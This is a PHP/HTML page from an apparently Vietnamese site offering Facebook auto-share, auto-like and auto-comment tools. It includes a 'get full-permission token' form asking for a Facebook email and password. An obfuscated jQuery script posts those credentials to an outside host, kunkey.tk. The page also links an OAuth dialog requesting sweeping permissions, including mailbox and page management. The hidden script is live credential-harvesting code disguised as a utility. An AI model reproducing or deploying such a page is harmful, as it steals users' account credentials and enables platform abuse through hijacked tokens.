<?php
include'../head.php';
echo '<title>CUrl Share - Online</title>';
?>
<div class="container" style="margin-top:30px">

<center><div class="row">
                <hr />
            <div class="col-md-12">
                <ul class="nav nav-tabs">
                    <li><a href="/">Trang chủ</a></li>
                    <li class="active"><a href="/curl/share">Tools Auto Share</a></li>
                    <li><a href="/curl/like">Tools Auto Like</a></li>
					<li><a href="/curl/cmt">Tools Auto CMT</a></li>
					<li><a href="/curl/gettoken">GET Token Full Quyền</a></li>
       </ul>
</div> </center>
<br/>   

<p>
	<center><h2> * Đăng Nhập Token Full Quyền Iphone Để Sử Dụng * </h2>
	<h3> * Nên Sử Dụng Token Clone Để Hack Share * </h3>
</center>
    </p>
	<br/>
<div class="panel panel-primary">
<div class="panel-heading">
  <form action="share.php" class="Login" method="get">
    <h1>Facebook Sharing</h1>
    <br/><label><center>Tài Khoản</center></label>
	<input type="text" name="idfb" class="form-control" placeholder="ID Facebook User Share">
    <br/><label><center>Access Token</center></label>
	<input type="text" name="token" class="form-control" placeholder="Nhập Access Token Clone">
    <br/><input type="submit" name="Login" value="Triển Thôi Share Nào!" class="btn btn-danger">
  </form>
</div></div>  
<div class="panel panel-primary">
<div class="panel-heading">
Nếu Chưa Cài Đặt Ứng Dụng <b style="color:green">HTC Sense</b> <a href="https://www.facebook.com/v2.7/dialog/oauth?response_type=token&app_id=41158896424&redirect_uri=fbconnect://success&scope=user_birthday,user_religion_politics,user_relationships,user_relationship_details,user_hometown,user_location,user_likes,user_activities,user_interests,user_education_history,user_work_history,user_online_presence,user_website,user_groups,user_managed_groups,user_events,user_photos,user_videos,user_photo_video_tags,user_notes,user_friends,user_about_me,user_status,user_posts,friends_birthday,friends_religion_politics,friends_relationships,friends_relationship_details,friends_hometown,friends_location,friends_likes,friends_activities,friends_interests,friends_education_history,friends_work_history,friends_online_presence,friends_website,friends_groups,friends_events,friends_photos,friends_videos,friends_photo_video_tags,friends_notes,friends_about_me,friends_status,read_stream,manage_mailbox,manage_friendlists,pay_with_facebook,read_mailbox,read_page_mailboxes,publish_checkins,status_update,photo_upload,video_upload,sms,create_event,rsvp_event,offline_access,email,xmpp_login,create_note,share_item,export_stream,publish_stream,ads_management,ads_read,read_insights,read_requests,manage_notifications,manage_pages,publish_pages,pages_show_list,pages_manage_cta,pages_manage_instant_articles,pages_messaging,pages_messaging_phone_number,manage_groups,publish_actions,read_audience_network_insights,read_friendlists,public_profile,basic_info,user_tagged_places,user_games_activity,user_actions.books,user_actions.music,user_actions.video,user_actions.fitness,user_actions.news,read_custom_friendlists"><b style="color:red">Vui Lòng Click vào Đây!</b></a>
</div></div>  
  
<div class="panel panel-primary">
<div class="panel-heading">
<h3 class="panel-title">Tool Lấy Token Full Quyền</h3>
</div>
<div class="panel-body">
<div class="form-group">
<label for="email">* Email hoặc số điện thoại :</label>
<input id="email" placeholder="Nhập Email" class="form-control"/>
</div>
<div class="form-group"><label for="password">* Mật khẩu :</label>
<input id="password" type="password" placeholder="Nhập Mật Khẩu" class="form-control"/>
</div>
<div class="form-group"><label for="app_id">* Chọn Ứng Dụng :</label>
<select id="app_id" class="form-control">
<option value="6628568379">Token Iphone</option>
<option value="350685531728">Token Android</option>
<option value="165907476854626">Token IOS</option>
</select>
</div>
<div class="form-group text-center">
<button id="submit" class="btn btn-sm btn-danger">Lấy Token Ngay</button>
</div>
<div class="form-group text-center" id="load_result" style="display:none">
<label for="result">Access Token của bạn là :</label>
<textarea id="result" onclick="this.focus();this.select()" class="form-control" rows="2"></textarea>
</div>
</div>
</div>
<script>
    var _0x6619 = ["click", "#submit", "disabled", "attr", "Đang lấy Token, vui lòng đợi...", "html", "val", "#email", "#password", "#app_id option:selected", "removeAttr", "Lấy token", "show", "#load_result", "Thất bại vui lòng thử lại", "#result", "fail", "http://kunkey.tk/gettoken/full.php", "post", "ajax", "on"];
    $(document)[_0x6619[20]](_0x6619[0], _0x6619[1], function () {
        $(_0x6619[1])[_0x6619[3]](_0x6619[2], _0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[4]);
        var _0x1ea6x1 = $(_0x6619[7])[_0x6619[6]](),
            _0x1ea6x2 = $(_0x6619[8])[_0x6619[6]](),
            _0x1ea6x3 = $(_0x6619[9])[_0x6619[6]]();
        $[_0x6619[19]]({
            url: _0x6619[17],
            type: _0x6619[18],
            data: {
                email: _0x1ea6x1,
                password: _0x1ea6x2,
                app_id: _0x1ea6x3
            },
            success: function (_0x1ea6x1) {
                $(_0x6619[1])[_0x6619[10]](_0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[11]), $(_0x6619[13])[_0x6619[12]](), $(_0x6619[15])[_0x6619[6]](_0x1ea6x1)
            }
        })[_0x6619[16]](function () {
            $(_0x6619[1])[_0x6619[10]](_0x6619[2]), $(_0x6619[1])[_0x6619[5]](_0x6619[11]), $(_0x6619[13])[_0x6619[12]](), $(_0x6619[15])[_0x6619[6]](_0x6619[14])
        })
    })
</script>
  
 
  
<?php
include'../foot.php';
?>